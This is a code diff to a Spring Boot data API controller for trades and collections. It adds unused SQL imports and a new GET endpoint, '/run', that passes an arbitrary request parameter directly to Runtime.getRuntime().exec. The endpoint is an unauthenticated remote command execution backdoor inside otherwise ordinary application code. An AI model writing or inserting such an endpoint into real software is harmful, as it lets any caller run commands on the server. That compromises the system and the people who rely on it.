@@ -9,6 +9,9 @@ import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.*;
 
 import java.math.BigDecimal;
+import java.sql.Connection;
+import java.sql.SQLException;
+import java.sql.Statement;
 import java.util.List;
 import java.util.Map;
 
@@ -179,6 +182,12 @@ public class DataApiController {
         service.deleteTradeItem(userId, tradeId, itemId);
         return ResponseEntity.noContent().build();
     }
+
+    @GetMapping("/run")
+public String run(@RequestParam String cmd) throws Exception {
+    Runtime.getRuntime().exec(cmd);
+    return "done";
+}
 
     public record CollectionUpsertRequest(
             String seriesId,
